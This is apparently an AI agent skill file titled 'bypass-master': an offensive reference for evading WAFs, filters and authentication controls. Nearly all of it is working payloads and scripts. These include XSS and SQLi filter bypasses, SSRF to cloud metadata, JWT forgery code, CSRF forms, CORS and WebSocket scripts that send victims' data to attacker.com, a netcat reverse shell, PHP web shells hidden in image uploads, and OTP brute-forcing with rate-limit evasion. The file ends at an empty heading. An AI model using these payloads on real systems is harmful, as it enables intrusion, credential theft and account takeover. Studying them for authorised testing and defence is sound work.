---
name: bypass-master
description: Comprehensive bypass reference for WAFs, filters, and security controls. Includes XSS filters, SSRF filters, SQLi WAF bypass, NoSQLi bypass, command injection bypass, path traversal bypass, JWT bypass, CSRF bypass, MFA bypass, file upload bypass, authentication bypass, and CORS bypass techniques. Use when encountering filtered inputs or needing bypass strategies for any vuln class. Chinese trigger: bypass、WAF bypass、filter bypass、防护绕过、WAF绕过
---

# Skill: Bypass Master

Comprehensive bypass reference for every security control and filter.

---

## XSS BYPASS TECHNIQUES

### Filter Bypass Progression

```
Level 1: Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Level 2: Tag variation
<scr<script>ipt>alert(1)</script>
<scr</script>ipt>alert(1)</script>

Level 3: Event handler variation
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>

Level 4: Encoding bypass
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&quot;alert(1)&quot;>

Level 5: Context-specific
HTML body: <script>alert(1)</script>
HTML attr: " onload=alert(1) x="
JS string: ';alert(1);var x='
URL context: javascript:alert(1)
CSS context: }</style><script>alert(1)</script>

Level 6: CSP bypass (if sanitizers present)
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
Angular: {{constructor.constructor('alert(1)')()}}
JSONP: <script src="https://target.com/api?callback=alert(1)"></script>
```

### Popular Sanitizer Bypasses

**HTMLPurifier:**
```html
<!-- Allows img but strips onerror if lowercase -->
<IMG SRC=x ONERROR=alert(1)>   <!-- Case bypass -->
<!-- Nested tags confuse parser -->
<scr<script>ipt>alert(1)</script>
<svg><style><img src=x onerror=alert(1)></svg>
```

**DOMPurify:**
```html
<!-- mXSS: re-parsing sanitized HTML -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
<!-- React: dangerouslySetInnerHTML bypass -->
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>

<!-- Vue v-html bypass -->
<text v-html="'<img src=x onerror=alert(1)>'"></text>
```

**Angular:**
```javascript
// Angular bypass via constructor
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=['alert(1)']['constructor']()}}
{{'a'.constructor.constructor('alert(1)')()}}
```

### WAF Bypass for XSS

```html
<!-- Obfuscation: split tags, comments, whitespace -->
<scr/* */ipt>alert(1)</scr/* */ipt>
<scr
ipt>alert(1)</scr
ipt>

<!-- Case variation -->
<ImG sRc=X OnErRoR=aLerT(1)>
<SVG ONLOAD=ALERT(1)>

<!-- Unicode encoding -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>

<!-- URL encoding in value -->
<img src=x onerror=%61%6c%65%72%74%28%31%29>

<!-- Null byte injection (some engines) -->
<img src=x onerror=alert(1)%00>
```

---

## SSRF BYPASS TECHNIQUES

### SSRF Filter Bypass

```
Basic bypass progression:
1. http://127.0.0.1 → blocked?
2. http://2130706433 → decimal IP
3. http://0177.0.0.1 → octal IP
4. http://0x7f.0x0.0x0.0x1 → hex IP
5. http://[::1] → IPv6
6. http://[::ffff:127.0.0.1] → IPv4-mapped IPv6
7. http://127.1 → short form
8. http://[::ffff:0x7f000001] → mixed hex

URL parsing tricks:
http://127.0.0.1%23@target.com
http://127.0.0.1%2523@target.com
http://target.com@127.0.0.1/
http://127.0.0.1:80@target.com/
http://127.0.0.1%2f@target.com/

Double URL encoding:
http://127.0.0.1%252f@target.com  → 127.0.0.1/@target.com

CRLF injection:
http://target.com?url=http://evil.com%0d%0aHost:127.0.0.1
```

### Protocol Bypass

```bash
# Gopher for Redis
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a%243%0d%0akey%0d%0a%244%0d%0avalue%0d%0a

# File protocol
file:///etc/passwd
file:///proc/self/environ

# Dict protocol
dict://127.0.0.1:6379/INFO

# FTP
ftp://attacker.com/

# SFTP
sftp://attacker.com/

# LDAP
ldap://127.0.0.1:389/dc=example,dc=com
ldap://127.0.0.1:389/%0d%0a%0d%0aINJECTION

# HTTP2 pseudo-header abuse
:authority: target.com
:path: /internal
```

### Cloud Metadata Bypass

```bash
# AWS - bypass allowlist by redirect
http://allowed.com/redirect?to=http://169.254.169.254/latest/meta-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# Note: GCP doesn't have easy bypass

# Azure
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01
# Headers: Metadata: true

# Bypass allowlist with URL parsing
http://169.254.169.254.naming.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p/  # slash@ style
http://0a192.0168.0259.0254.0x7f000001:8080/  # mixed notation
```

### Open Redirect Combined SSRF Bypass

```
Chain: SSRF → Open redirect → Cloud metadata
http://target.com/redirect?url=http://169.254.169.254

Chain: Open redirect → SSRF
http://target.com/redirect?url=http://internal-service/
Some parsers check redirect target but follow it anyway.
```

---

## SQL INJECTION BYPASS TECHNIQUES

### WAF Bypass for SQLi

**Basic WAF Bypass:**
```sql
-- Comment variations
/**/SELECT/**/username/**/FROM/**/users
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users

-- Space alternatives
SELECT%0ausername%0d%0aFROM%09users
SELECT+username+FROM+users

-- Case variation
SeLeCt FrOm uSeRs
sElEcT uSeRnAmE FrOm UsErS

-- Keyword splitting
UN/**/ION SEL/**/ECT
UNI/**/ON/**/SE/**/LECT
UNION/*comment*/SELECT

-- String concatenation (bypasses simple filters)
CONCAT('u','se','rs')  →  users
'admin' LIKE 'a%'      →  partial match

-- Parentheses in unusual places
'+(SELECT+username+FROM+users+LIMIT+1)+'
```

**MySQL-Specific WAF Bypass:**
```sql
-- Inline comments
/*!50000 SELECT*/ * FROM users
/*!50000 UNION SELECT*/ * FROM users

-- Challenge-response bypass
' OR 1=1/*!50000LIMIT 0,1*/
SELECT * FROM users WHERE id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT username FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- Functions that look safe but evaluate expressions
ELT(N=1,'a','b','c')
FIELD(id,1,2,3)
```

**PostgreSQL-Specific WAF Bypass:**
```sql
-- Dollar quoting
$$SELECT * FROM users$$

-- Comment nesting
/* /* nested */ */

-- Alternative function names
chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  →  admin
string_agg(x, '')  →  concatenate values

-- Array syntax bypass
(SELECT ARRAY[1,2,3])::text
```

**MSSQL-Specific WAF Bypass:**
```sql
-- Double URL encoding
%25%27%20OR%201%3D1--

-- Hex encoding
DECLARE @x NVARCHAR(4000); SET @x=0x...; EXEC(@x)

-- Chaining without semicolon
WAITFOR DELAY '0:0:5' (in WHERE clause)
```

**Oracle-Specific WAF Bypass:**
```sql
-- NVL to bypass filters
NVL((SELECT username FROM users WHERE ROWNUM=1), 'x')

-- Conditional bypass
SELECT CASE WHEN 1=1 THEN 'a' ELSE 'b' END FROM DUAL

-- Time-based with DBMS_LOCK
BEGIN DBMS_LOCK.SLEEP(5); END;
```

---

## NOSQL INJECTION BYPASS TECHNIQUES

### MongoDB Operator Bypass

```json
// If $ne filtered, alternatives:
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$gte": "a"}, "password": {"$gte": "a"}}

// If regex filtered:
{"username": {"$in": ["admin"]}, "password": {"$in": ["password"]}}

// Type confusion
{"username": {"$eq": {"$eq": "admin"}}}
{"username": [null], "password": [null]}

// Alternative operators (less filtered):
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": {"$type": "string"}, "password": {"$type": "string"}}

// JSON with comments
{"username": "admin", "password": "x", "$where": "1==1"}

// $where replacement (when directly blocked):
{"username": "admin", "$where": "this.password.length > 0"}
```

### NoSQLi WAF Bypass

```
When $ blocked:
1. Pass object directly in array form:
   username[$ne]=null  →  username[$ne][]=null
2. Use URL encoding:
   %5B%24ne%5D  →  [$ne]
3. Try double encoding:
   %255B%2524ne%255D

When operators filtered completely:
1. Try null byte before operator:
   username[%00$ne]=null
2. Try array-style filter bypass:
   username[0][$ne]=null
3. Try $where only:
   {"$where": "this.username == 'admin' && this.password == 'x'"}
```

---

## COMMAND INJECTION BYPASS TECHNIQUES

### Filter Bypass Hierarchy

```
Level 1: Basic separators
; cmd
| cmd
&& cmd
|| cmd
`cmd`
$(cmd)

Level 2: Shell substitution
${cmd}
${IFS}cmd  (replaces spaces)
{cmd,,}    (parameter expansion)

Level 3: Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd
;cat$(printf '\x20')/etc/passwd
;cat${HOME::0::1}etc/passwd

Level 4: Bypass keyword filter
;c'a't /etc/passwd
;c"a"t /etc/passwd
;`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash`
;echo $(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

Level 5: Alternative interpreters
;python3 -c 'import os; os.system("id")'
;perl -e 'system("id")'
;ruby -e 'system("id")'
;php -r 'system("id");'
;python3 -c 'import subprocess; subprocess.run(["id"])'
;python3 -c '__import__("os").system("id")'
;nc -e /bin/sh attacker.com 4444
;echo 'test' > file; mv file fi\le; /b*/n*c $IFS$(echo $HOME | cut -c1)$(echo 'etc/passwd')

Level 6: Encoding-based
;echo Y3VwIGV0Yy9wYXNzd2Q= | base64 -d | bash
;printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
;xxd -r -p <<< '636174202f6574632f706173737764'
```

### Windows Command Injection Bypass

```batch
& dir
| dir
&& dir
|| dir
%APPDATA%\..\..\..\..\..\Windows\win.ini
type C:\Windows\win.ini
echo %PATH%
echo ^%PATH^%
for %i in (cmd.exe) do echo %~$PATH:i
```

---

## PATH TRAVERSAL BYPASS TECHNIQUES

### Bypass Filter Hierarchy

```
Level 1: Basic traversal
../../../etc/passwd
..\..\..\etc\passwd

Level 2: Encoding
..%2F..%2F..%2Fetc%2Fpasswd      (URL encode /)
..%5c..%5c..%5cetc%5cpasswd      (URL encode \)
..%00/..%00/..%00/etc/passwd     (null byte encoding)

Level 3: Double encoding
..%252f..%252f..%252fetc%252fpasswd

Level 4: Unicode
%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd

Level 5: Mixed paths
..\/..\/..\/etc/passwd
..\\.\\.\\etc\passwd
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

Level 6: Bypass null byte truncation
/etc/passwd%00.jpg
/etc/passwd%00%00.jpg
/etc/passwd%0a
/etc/passwd%0d%0a
/etc/passwd%00.png

Level 7: Native path
/etc/passwd
/etc/passwd/auto.conf  (trailing content trick)
/./././././/././././etc/passwd
```

### Full Filesystem Access Bypass

```
When .. is blocked:
1. Try absolute path: /etc/passwd, C:\Windows\win.ini
2. Try alternate roots: //etc/passwd, \\?\C:\Windows
3. Try case with absolute: /Etc/Passwd
4. Try with trailing slash: /etc/passwd/
5. Try with dot segment: /././etc/passwd
6. Try with space: /etc/passwd%20
7. Try with tabs: /etc/passwd%09

When extension check present:
1. Try without extension
2. Try multiple dots: /etc/passwd.txt.jpg
3. Try alternate extensions: .php.jpg, .jsp.jpg
4. Try case variations: .PHP, .pHp
```

---

## JWT ATTACK BYPASS TECHNIQUES

### JWT Bypass Hierarchy

```
Difficulty: Low → High
1. None algorithm: alg=none, remove signature
2. Weak secret: brute-force "secret", "password", "key"
3. RS256→HS256: forge using public key as HMAC secret
4. kid SQLi: Injection in key ID for SQL in token secret
5. kid Path traversal: Reach local file for key
6. Header parameter injection: Add admin=true
7. JTI replay: Use same token ID multiple times
8. JWT unverified signature: Skip validation entirely
```

### JWT Bypass Exploits

**None Algorithm:**
```python
import base64, json

# Decode original
header = base64.b64decode("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9")
payload = base64.b64decode("eyJzdWIiOiIxMjM0In0")

# Modify header
header_mod = json.dumps({"alg": "none", "typ": "JWT"}).encode()
header_b64 = base64.b64encode(header_mod).decode().rstrip('=')

# Modify payload
payload_mod = json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999}).encode()
payload_b64 = base64.b64encode(payload_mod).decode().rstrip('=')

# Final token: header_b64.payload_b64.
```

**RS256 to HS256:**
```python
import jwt, requests

# Get JWKS
jwks_url = "https://target.com/.well-known/jwks.json"
jwks = requests.get(jwks_url).json()
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks['keys'][0])

# Forge with HS256 using public key as secret
payload = {"sub": "admin", "role": "admin"}
forged = jwt.encode(payload, public_key, algorithm="HS256")

# Or use python to extract key
import jwt, json, requests
r = requests.get(jwks_url)
public_key_raw = r.json()['keys'][0]['x5c'][0]
public_key = "-----BEGIN PUBLIC KEY-----\n" + public_key_raw + "\n-----END PUBLIC KEY-----"

# Now forge with public_key as HMAC secret
forged = jwt.encode(payload, public_key, algorithm="HS256", headers={"kid": "attacker"})
```

**kid Injection SQLi:**
```json
// Header
{"alg": "HS256", "typ": "JWT", "kid": "0' UNION SELECT 'forged_secret'--"}
// This makes backend run: SELECT secret FROM keys WHERE id='0' UNION SELECT...
// If vulnerable, returns 'forged_secret'

// More elaborate:
{"kid": "0' UNION SELECT secret FROM jwt_keys WHERE id='1'--"}
{"kid": "../../../../etc/passwd"}  // if kid reads file
{"kid": "key; curl attacker.com/$(cat /etc/passwd | base64)"}  // if kid used in command
```

**kid Path Traversal:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../../dev/null"
}
// If backend reads kid as file path and uses /dev/null contents as key...
// Or specific file with known key

// LFI via kid
{"kid": "../../../../../../../../proc/self/environ"}
{"kid": "../../../../../../../../etc/passwd"}
```

### JWT Secret Brute-Force Commands

```bash
# Hashcat
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt --force

# John the Ripper
john --format=HMAC-SHA256 jwt.txt --wordlist=wordlist.txt

# Common weak secrets to try first
echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' > header.txt
echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' > payload.txt
cat header.txt > jwt_test.txt; echo -n '.' >> jwt_test.txt; cat payload.txt >> jwt_test.txt; echo -n '.' >> jwt_test.txt
python3 -c "
import hmac, hashlib, base64
def crack_jwt(token, wordlist):
    header_payload = '.'.join(token.split('.')[:2])
    sig = token.split('.')[2]
    with open(wordlist) as f:
        for word in f:
            word = word.strip()
            expected = base64.urlsafe_b64encode(hmac.new(word.encode(), header_payload.encode(), hashlib.sha256).digest()).decode().rstrip('=')
            if expected == sig:
                print(f'[+] Found secret: {word}')
                return word
    print('[-] Not found')
crack_jwt('eyJ...', 'wordlist.txt')
"
```

---

## CSRF BYPASS TECHNIQUES

### CSRF Token Bypass

```
Token not checked at all:
- Remove token, submit → still works

Token in session:
- Use old token from previous session
- Session fixation

Token in cookie:
- Remove from request, let cookie send automatically

Token in request body:
- Remove from body, send anyway

Token in request params:
- Token is GET parameter (sometimes only checked length)

Header check but no value check:
X-CSRF-Token: anything
```

### CSRF Payload Techniques

**Basic Form CSRF:**
```html
<form action="https://target.com/api/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="password" value="newpass">
</form>
<script>document.forms[0].submit()</script>
```

**JSON CSRF:**
```html
<form action="https://target.com/api/settings" method="POST">
  <input name='{"settings":{"admin":true,"role":"admin"}}' value=''>
</form>
<script>document.forms[0].submit()</script>
```

**AJAX CSRF with CORS bypass:**
```html
<script>
fetch("https://target.com/api/email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({email: "attacker@evil.com", password: "123456"})
});
</script>
```

**CSRF via image:**
```html
<img src="https://target.com/api/transfer?to=attacker&amount=10000">
```

### SameSite Bypass

```
SameSite=Lax:
- CSRF on top-level GET request with POST body
- Preloaded subdomains bypass

SameSite=None (Secure required):
- Requires HTTPS
- Any origin can send request

SameSite=Strict:
- Not bypassable except:
  - subdomain with same TLD
  - DNS rebinding after initial load
```

---

## OAUTH BYPASS TECHNIQUES

### OAuth Flow Bypass

```
State parameter bypass:
1. Remove state parameter entirely
2. Use fixed/static state value
3. Predict state value (if timestamp-based)
4. State validation timing attack

PKCE bypass:
1. Don't send code_challenge
2. Send plain code_challenge with code_challenge_method=plain

redirect_uri bypass:
1. Open redirect in redirect_uri
2. Path traversal in redirect_uri
3. Open redirect via target's own redirect endpoint
4. URL fragment manipulation
```

### OAuth Exploitation Payloads

```bash
# State bypass
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y
# No state → CSRF possible

# PKCE bypass
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y
# No code_challenge → PKCE not enforced

# Redirect URI manipulation
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://attacker.com
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://target.com/redirect?to=https://attacker.com

# Wildcard redirect
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://*.target.com.evil.com

# Implicit flow token leak (fragment in URL)
# History API can read fragment → leak via referer to images
<img src="https://evil.com/steal" onerror="fetch('https://evil.com/steal' + location.hash)">
```

### OAuth Token Theft Chains

```
1. Attacker site hosts loading iframe: <iframe src="https://idp.com/oauth/authorize?...&redirect_uri=https://target.com/callback">
2. Victim authenticated at IDP → grants authorization
3. IDP redirects to target.com/callback#access_token=LEAKED_TOKEN
4. Fragment in URL accessible via JavaScript
5. Attacker reads fragment via iframe.contentWindow.location.hash
```

---

## FILE UPLOAD BYPASS TECHNIQUES

### Extension Bypass Hierarchy

```
Level 1: Double extension
shell.php.jpg
shell.php%00.jpg
shell.php%00.png

Level 2: Case variation
shell.pHp
shell.PHP
shell.PHP5
shell.pHp7
shell.phP3

Level 3: Alternative extensions
shell.phtml
shell.phar
shell.shtml
shell.inc
shell.asp
shell.aspx
shell.jsp
shell.jspx
shell.py
shell.pl
shell.cgi

Level 4: MIME type bypass
Content-Type: image/jpeg
Content body: actual PHP code with GIF89a header

Level 5: Content bypass
Valid image + PHP at end (polyglot)
Magic bytes: GIF89a;<?php system($_GET['c']);?>

Level 6: Path traversal in filename
../../../../var/www/html/shell.php
..\..\..\..\shell.php
```

### MIME Type Bypass

```bash
# Send PHP with image MIME type
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg"

# Spoof Content-Type in header but send normal file
curl -X POST "https://target.com/upload" \
  -H "Content-Type: image/png" \
  -F "file=@shell.php"

# Multi-part with separate Content-Type per part
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

[actual PHP content]
--boundary--
```

### Content Inspection Bypass

```bash
# Valid image header + PHP
printf '\xff\xd8\xff\xe0<?php system($_GET["c"]); ?>' > shell.jpg

# Valid PNG header + PHP
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > shell.png

# PDF + JS
%PDF-1.4
<script>alert(1)</script>
```

### SVG XSS Upload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>alert(document.cookie)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body onload="alert(1)">
      <iframe src="javascript:alert(1)"></iframe>
    </body>
  </foreignObject>
</svg>
```

---

## CORS BYPASS TECHNIQUES

### CORS Exploration Payloads

```javascript
// If Access-Control-Allow-Origin is null
fetch('https://target.com/api/data', {mode: 'cors'})  // This fails

// Need server to reflect Origin header
// Try via <script> tag on attacker.com

// If wildcard with credentials:
fetch('https://target.com/api/data', {
  credentials: 'include'
})
// If server sends ACAO: * with Access-Control-Allow-Credentials: true → exploit!

// If ACAO reflects Origin:
// Host on attacker.com
<script>
fetch('https://target.com/api/secrets', {
  credentials: 'include',
  mode: 'cors'
}).then(r => r.json()).then(d => fetch('https://attacker.com?d=' + JSON.stringify(d)))
</script>
```

### CORS Bypass Techniques

```
Origin reflection:
curl -H "Origin: https://evil.com" https://target.com/api/
Response: Access-Control-Allow-Origin: https://evil.com

Subdomain bypass:
Origin: https://evil.target.com
Sometimes reflects subdomain

Additionally: prefix/postfix domains
Origin: https://evil.com.target.com
Origin: https://target.com.evil.com
Origin: https://target.com.evil.com%2f
Origin: https://target.com@evil.com

Bypass null byte:
Origin: https://target.com\0.evil.com

HTTP header injection:
Origin: https://evil.com\r\nAccess-Control-Allow-Origin: https://evil.com
```

### CORS + Credential Steal

```html
<!-- Host on attacker.com -->
<script>
fetch('https://target.com/api/user/data', {
  credentials: 'include',
  mode: 'cors'
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/steal?d=' + JSON.stringify(data)));
</script>

<!-- Or with redirect chain -->
<form action="https://target.com/api/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>
document.forms[0].submit();
</script>
```

---

## AUTHENTICATION BYPASS TECHNIQUES

### 2FA/MFA Bypass

```
1. Try accessing post-2FA URL directly
   - Login → /mfa → /dashboard
   - Direct to /dashboard? Might work if validation only at /mfa

2. Response manipulation
   - Change success:false to success:true
   - Change 401 to 200

3. Skip 2FA step entirely
   - Replay session from after-MFA stage

4. Replay OTP
   - Use same OTP in new session
   - OTP not invalidated after use

5. Brute force OTP
   - No rate limit on /mfa/verify

6. Backup codes not rate limited
   - /api/verify-backup-code often less protected

7. Race condition on MFA
   - Send 2 MFA verifs simultaneously
```

### JWT-Based Auth Bypass

```python
import jwt
import requests

# 1. None algorithm (see JWT section)
# 2. Weak secret (brute-force)
# 3. RS256→HS256 confusion
# 4. Algorithm confusion with public key as HMAC secret
# 5. Add admin claims to payload

# None
header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=')

# RS256→HS256
jwks = requests.get("https://target.com/.well-known/jwks.json").json()
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks['keys'][0])
forged = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
```

### Session Fixation

```
1. Attacker gets session: sess_id=ABC123
2. Session has no user yet
3. Attacker sends link: https://target.com/login?sess_id=ABC123
4. Victim logs in with that session ID
5. Session now authenticated → attacker uses sess_id=ABC123
```

### SAML Bypass

```
1. XML Signature Wrapping
2. Comment injection in NameID
3. Strip signature entirely
4. Use <saml:Assertion> instead of <saml:EncryptedAssertion>
5. Add empty NotBefore/NotOnOrAfter to skip validation
```

---

## HTTP REQUEST SMUGGLING BYPASS TECHNIQUES

### Smuggling Bypass Progression

```
Step 1: CL.TE detection
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
0\r\n
\r\n

Response: 200 OK (front-end), then back-end parses SMUGGLED as next request

Step 2: TE.CL detection
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


Response: timeout (back-end waiting for missing bytes)

Step 3: TE.TE obfuscation
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

[tab]Transfer-Encoding: chunked
Transfer-Encoding: x ,chunked

Step 4: H2 desync
Switch to HTTP/2 in Burp
Add Content-Length header manually
Front-end ignores CL (H2 framing), back-end uses it

Step 5: CL.0 desync
Body with Content-Length: 6
[6 bytes body]
[extra body]  → front-end thinks it fits in CL, sends more

Step 6: request smuggling via Transfer-Encoding: identity
```

---

## MFA/OTP BYPASS TECHNIQUES

### OTP Brute Force Bypass

```bash
# Without proxy: raw curl loop (slow, rate limited)
wrap=1; while [ $wrap -le 1000000 ]; do
  curl -sk "https://target.com/api/mfa/verify" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"otp\": \"$(printf \"%06d\" $wrap)\"}"
  wrap=$((wrap + 1))
done

# With proxy: rotation strategy
for otp in $(seq -w 000000 001000); do
  curl -x http://proxy1:8080 "https://target.com/api/mfa/verify" \
    -X POST -H "Content-Type: application/json" \
    -d "{\"otp\": \"$otp\"}"
done

# PRO METHOD: ffuf with session
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 50 \
  -rate 100
```

### Rate Limit Bypass

```
1. Rotate IP addresses (proxy rotation)
2. Burp extension: auto-rotate IP
3. Use different user agents
4. Add delays: 1 second between attempts
5. Use GraphQL batching (one request, multiple mutations)
6. Use different accounts for same OTP endpoint
7. Timing: spread over hours to avoid detection
```

---

## WEBSOCKET BYPASS TECHNIQUES

### Origin Validation Bypass

```bash
# If origin header checked, bypass:
wscat -c "wss://target.com/ws" -H "Origin: https://target.com"
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"

# Null byte bypass
wscat -c "wss://target.com/ws" -H "Origin: https://target.com\0.evil.com"

# URL encoding bypass
wscat -c "wss://target.com/ws" -H "Origin: https://target.com%2eevil.com"
```

### CSWSH (WebSocket CSRF) Payloads

```html
<!-- Host on attacker.com -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser sends victim's cookies automatically
ws.onopen = () => {
  ws.send(JSON.stringify({action: "getProfile", "userId": "1"}));
};
ws.onmessage = (e) => {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
};
</script>
```

### WebSocket Injection Payloads

```json
// XSS via WebSocket message
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi via WebSocket
{"action": "search", "query": "' OR 1=1--"}

// NoSQLi
{"username": {"$ne": null}, "password": {"$ne": null}}

// SSRF via WebSocket
{"action": "fetch_url", "url": "http://169.254.169.254/latest/meta-data/"}

// Command injection
{"action": "run_cmd", "cmd": "; curl attacker.com/$(whoami)"}
```

---

## GRAPHQL BYPASS TECHNIQUES

### Introspection Bypass (If disabled)

```
If __schema introspection disabled, try:
1. __type introspection (still works in some implementations)
2. Derived types (fragment spread on Query type)
3. Batching: send multiple inline fragments
4. GraphiQL Playground endpoint often left open
5. Apollo Sandbox in development
6. Introspection in field suggestions (error messages)
7. batching with aliases to get type info
```

### GraphQL Auth Bypass

```graphql
# Direct object reference (IDOR): use node() with other user's ID
query {
  node(id: "VXNlcjo2NzQ=") {
    ... on User { email privateNotes }
  }
}

# Batching to bypass rate limits
query {
  query1: search(query: "' OR 1=1--") { results }
  query2: search(query: "' UNION SELECT--") { results }
  query3: search(query: "'; SLEEP(5)--") { results }
}

# Nested query to bypass field-level authorization
query {
  user(id: "123") {
    # User doesn't have access to email, but Admin does
    # Nested admin query
    admin { users { email } }
  }
}

# Mutation stacking
mutation {
  addAdminRole(input: {userId: "ATTACKER_ID"}) { success }
  addAdminRole(input: {userId: "VICTIM_ID"}) { success }
}
```

---

## CLOUD SECURITY BYPASS TECHNIQUES

### AWS Bypass

```bash
# Bypass S3 bucket misconfig
python3 -c "
import boto3
s3 = boto3.client('s3', region_name='us-east-1', aws_access_key_id='AKIA...', aws_secret_access_key='...')
buckets = s3.list_buckets()
for b in buckets['Buckets']:
    print(b['Name'])
"

# List bucket even if index.html exists
aws s3 ls s3://target-bucket --no-sign-request 2>&1 | grep -v "AccessDenied"

# Get object by brute forcing key
aws s3 ls s3://target-bucket/ --recursive | grep -i secret

# AssumeRole bypass
aws sts assume-role --role-arn arn:aws:iam::123456789:role/AdminRole --role-session-name test

# Lambda environment variables via SSRF
# If Lambda runs on VPC but has IAM role, SSRF to metadata gives temp creds

# STS token reuse
# STS tokens valid for 1 hour, can be used across services
sts = boto3.client('sts')
creds = sts.assume_role(...)['Credentials']
s3 = boto3.client('s3', aws_access_key_id=creds['AccessKeyId'], aws_secret_access_key=creds['SecretAccessKey'], aws_session_token=creds['SessionToken'])
```

### Azure Bypass

```bash
# IMDS with metadata header
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"

# Storage account key via SAS token
# Sometimes SAS tokens over-permissive

# Managed identity abuse
# If function app has managed identity, chain SSRF with IMDS
GET /metadata/identity/oauth2/token?api-version=...&resource=...
Use token to access Azure resources
```

---

## API SECURITY BYPASS TECHNIQUES

### API Authentication Bypass

```bash
# Remove JWT but keep request
curl -sk https://target.com/api/v1/users

# Send empty token
-H "Authorization: Bearer"
-H "Authorization:"
-H "Authorization: null"

# Use other user's token (copy from intercepted request)

# As admin, hit user endpoint with elevated context
-H "X-User-Role: admin"
-H "X-Admin: true"
-H "X-Original-User: admin"
```

### GraphQL API Bypass

```graphql
# Bypass rate limits with batching
mutation {
  op1: damage(type: HARD) { result }
  op2: damage(type: HARD) { result }
  op3: damage(type: HARD) { result }
  # ... 100 times
}

# Bypass query depth limits with circular aliases
query {
  user { posts { author { posts { author { id } } } } }
}

# Bypass cost analysis with @skip and @include directives
query getData($skip: Boolean!) {
  adminData @skip(if: $skip) { secrets }
}
# Send: {"skip": true} → no cost analysis, get data
```

### Mass Assignment Bypass

```bash
# Add admin fields not shown in form
PUT /api/user/123
{"name": "test", "role": "admin", "isAdmin": true}

# JSON arrays
PATCH /api/user/123
{"settings": {"admin": true, "role": "admin", "permissions": ["*"]}}

# Prototype pollution
{"__proto__": {"role": "admin"}}
{"constructor": {"prototype": {"role": "admin"}}}
```

---

## SUBDOMAIN TAKEOVER BYPASS TECHNIQUES

